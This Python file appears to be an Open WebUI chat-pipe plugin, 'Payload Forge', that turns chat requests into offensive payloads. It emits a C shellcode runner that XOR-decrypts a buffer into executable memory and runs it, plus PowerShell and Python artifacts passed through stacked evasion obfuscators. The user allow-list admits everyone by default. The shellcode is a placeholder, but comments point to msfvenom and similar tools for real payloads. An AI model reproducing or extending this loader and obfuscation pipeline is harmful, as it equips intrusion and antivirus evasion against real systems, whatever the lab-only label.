"""
title: Payload Forge Manifold
author: redteam
version: 0.2.0
required_open_webui_version: 0.3.9
description: |
  Red team payload generation & obfuscation pipe for authorized
  research / lab use only. Exposes multiple sub-models via manifold,
  parses chat-driven specs, and emits status events for human-in-the-loop.
"""

import asyncio
import base64
import json
import os
import random
import re
import string
from typing import Any, AsyncGenerator, Awaitable, Callable, Optional

from pydantic import BaseModel, Field


# ---------------------------------------------------------------------------
# Generators (toy/lab implementations — replace with your real toolchain
# such as msfvenom subprocess calls, donut, sgn, etc., behind a sandbox)
# ---------------------------------------------------------------------------

def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def gen_shellcode_runner(spec: dict) -> dict:
    """
    Lab-only stub: returns a C source skeleton that XOR-decrypts an
    embedded shellcode buffer and executes it via VirtualAlloc+memcpy.
    The shellcode bytes here are placeholder NOP sled; in a real lab
    you'd shell out to msfvenom or similar.
    """
    arch = spec.get("arch", "x64")
    cmd = spec.get("cmd", "calc.exe")
    # placeholder — NOT functional shellcode, just bytes for the demo
    sc = bytes([0x90] * 32) + b"PLACEHOLDER:" + cmd.encode()
    key = os.urandom(8)
    enc = _xor(sc, key)

    enc_arr = ", ".join(f"0x{b:02x}" for b in enc)
    key_arr = ", ".join(f"0x{b:02x}" for b in key)
    src = f"""// arch={arch}  cmd={cmd}  (lab artifact)
#include <windows.h>
#include <string.h>
unsigned char enc[] = {{ {enc_arr} }};
unsigned char key[] = {{ {key_arr} }};
int main(void) {{
    for (size_t i = 0; i < sizeof(enc); ++i) enc[i] ^= key[i % sizeof(key)];
    void *p = VirtualAlloc(0, sizeof(enc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(p, enc, sizeof(enc));
    ((void(*)())p)();
    return 0;
}}
"""
    return {"language": "c", "artifact": src, "meta": {"key_len": len(key)}}


def gen_powershell(spec: dict) -> dict:
    cmd = spec.get("cmd", "Get-Process")
    return {
        "language": "powershell",
        "artifact": f"# lab artifact\n{cmd}\n",
        "meta": {},
    }


def gen_python(spec: dict) -> dict:
    cmd = spec.get("cmd", "print('hello from lab')")
    return {
        "language": "python",
        "artifact": f"# lab artifact\n{cmd}\n",
        "meta": {},
    }


GENERATORS = {
    "shellcode": gen_shellcode_runner,
    "powershell": gen_powershell,
    "python": gen_python,
}


# ---------------------------------------------------------------------------
# Obfuscation chain — composable transforms keyed by name
# ---------------------------------------------------------------------------

def obf_b64(art: str) -> str:
    return base64.b64encode(art.encode()).decode()


def obf_rename(art: str) -> str:
    """Trivial identifier renaming for PS/Python — illustrative only."""
    mapping = {}
    def repl(m):
        tok = m.group(0)
        if tok in {"def", "if", "for", "while", "return", "import",
                   "from", "as", "in", "is", "not", "and", "or",
                   "function", "param", "Get-Process"}:
            return tok
        if tok not in mapping:
            mapping[tok] = "_" + "".join(random.choices(string.ascii_lowercase, k=6))
        return mapping[tok]
    return re.sub(r"\b[A-Za-z_][A-Za-z0-9_]{2,}\b", repl, art)


def obf_str_split(art: str) -> str:
    """PowerShell-style string splitting demo."""
    return re.sub(
        r'"([^"\\]{4,})"',
        lambda m: '("' + '"+"'.join(m.group(1)[i:i+2] for i in range(0, len(m.group(1)), 2)) + '")',
        art,
    )


OBFUSCATORS = {
    "b64": obf_b64,
    "rename": obf_rename,
    "str_split": obf_str_split,
}


# ---------------------------------------------------------------------------
# Spec parser — pulls structured request out of free-form chat
# Accepted forms:
#   1. fenced ```json {...} ``` block
#   2. key:value lines  (cmd: calc.exe / arch: x64 / obf: b64,rename)
# ---------------------------------------------------------------------------

def parse_spec(user_message: str) -> dict:
    spec: dict[str, Any] = {}

    m = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", user_message, re.S)
    if m:
        try:
            spec.update(json.loads(m.group(1)))
        except json.JSONDecodeError:
            pass

    for line in user_message.splitlines():
        kv = re.match(r"\s*([a-zA-Z_]+)\s*[:=]\s*(.+?)\s*$", line)
        if not kv:
            continue
        k, v = kv.group(1).lower(), kv.group(2).strip()
        if k == "obf":
            spec["obf"] = [x.strip() for x in v.split(",") if x.strip()]
        else:
            spec[k] = v
    return spec


# ---------------------------------------------------------------------------
# The Pipe class — Open WebUI discovers this by name
# ---------------------------------------------------------------------------

class Pipe:
    class Valves(BaseModel):
        ENABLED: bool = Field(
            default=True,
            description="Master kill-switch. Set false to disable all generation.",
        )
        ALLOW_LIST_USERS: str = Field(
            default="",
            description="Comma-separated user emails permitted to use this pipe. Empty = allow all.",
        )
        MAX_OBF_DEPTH: int = Field(
            default=3,
            description="Maximum number of stacked obfuscators per request.",
        )
        AUDIT_LOG_PATH: str = Field(
            default="/tmp/payload_forge_audit.log",
            description="Append-only audit log. Every generation is recorded.",
        )
        DRY_RUN: bool = Field(
            default=False,
            description="If true, return the spec parse result but do NOT generate artifacts.",
        )

    def __init__(self) -> None:
        self.type = "manifold"
        self.id = "payload_forge"
        self.name = "payload-forge."
        self.valves = self.Valves()

    # Each entry becomes a selectable "model" in the Open WebUI sidebar.
    def pipes(self) -> list[dict]:
        return [
            {"id": "shellcode", "name": "shellcode (C runner)"},
            {"id": "powershell", "name": "powershell"},
            {"id": "python", "name": "python"},
        ]

    # -----------------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------------

    def _authorized(self, user: Optional[dict]) -> bool:
        allow = [x.strip() for x in self.valves.ALLOW_LIST_USERS.split(",") if x.strip()]
        if not allow:
            return True
        if not user:
            return False
        return user.get("email") in allow

    def _audit(self, user: Optional[dict], model_id: str, spec: dict) -> None:
        try:
            with open(self.valves.AUDIT_LOG_PATH, "a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "user": (user or {}).get("email", "anonymous"),
                    "model": model_id,
                    "spec": spec,
                }) + "\n")
        except OSError:
            pass  # don't fail the request because audit failed; surface elsewhere

    @staticmethod
    async def _emit(emitter, level: str, msg: str, done: bool = False) -> None:
        if emitter is None:
            return
        await emitter({
            "type": "status",
            "data": {"description": msg, "done": done, "level": level},
        })

    # -----------------------------------------------------------------------
    # Main entry point — Open WebUI calls this for every chat turn
    # -----------------------------------------------------------------------

    async def pipe(
        self,
        body: dict,
        __user__: Optional[dict] = None,
        __event_emitter__: Optional[Callable[[dict], Awaitable[None]]] = None,
    ) -> AsyncGenerator[str, None]:

        # 1. Gate checks
        if not self.valves.ENABLED:
            yield "❌ Pipe disabled by valves.ENABLED."
            return
        if not self._authorized(__user__):
            yield "❌ User not on ALLOW_LIST_USERS."
            return

        # 2. Resolve which sub-model the user picked.
        # Open WebUI sends the full id as `payload_forge.shellcode` etc.
        raw_model = body.get("model", "")
        sub = raw_model.split(".", 1)[1] if "." in raw_model else raw_model
        if sub not in GENERATORS:
            yield f"❌ Unknown sub-model: {sub!r}. Pick one of {list(GENERATORS)}."
            return

        # 3. Pull last user message
        messages = body.get("messages", [])
        user_msg = next(
            (m["content"] for m in reversed(messages) if m.get("role") == "user"),
            "",
        )
        if isinstance(user_msg, list):  # multimodal content array
            user_msg = " ".join(p.get("text", "") for p in user_msg if isinstance(p, dict))

        await self._emit(__event_emitter__, "info", f"Parsing spec for {sub}…")
        spec = parse_spec(user_msg)

        if self.valves.DRY_RUN:
            yield "```json\n" + json.dumps({"sub": sub, "spec": spec}, indent=2) + "\n```"
            await self._emit(__event_emitter__, "info", "Dry run complete.", done=True)
            return

        # 4. Generate
        await self._emit(__event_emitter__, "info", "Generating artifact…")
        try:
            result = GENERATORS[sub](spec)
        except Exception as e:
            yield f"❌ Generator error: {e!r}"
            return

        artifact: str = result["artifact"]

        # 5. Apply obfuscation chain
        chain = spec.get("obf", [])
        if isinstance(chain, str):
            chain = [chain]
        chain = chain[: self.valves.MAX_OBF_DEPTH]

        applied = []
        for step in chain:
            fn = OBFUSCATORS.get(step)
            if fn is None:
                yield f"⚠️ Unknown obfuscator skipped: {step!r}\n"
                continue
            await self._emit(__event_emitter__, "info", f"Obfuscating: {step}")
            artifact = fn(artifact)
            applied.append(step)
            await asyncio.sleep(0)  # yield control to keep UI responsive

        # 6. Audit
        self._audit(__user__, sub, {**spec, "obf_applied": applied})

        # 7. Stream response back
        await self._emit(__event_emitter__, "info", "Done.", done=True)
        header = (
            f"**model:** `{sub}`  •  "
            f"**obf chain:** `{applied or 'none'}`  •  "
            f"**meta:** `{result.get('meta', {})}`\n\n"
        )
        for chunk in (header,
                      f"```{result['language']}\n",
                      artifact,
                      "\n```\n"):
            yield chunk
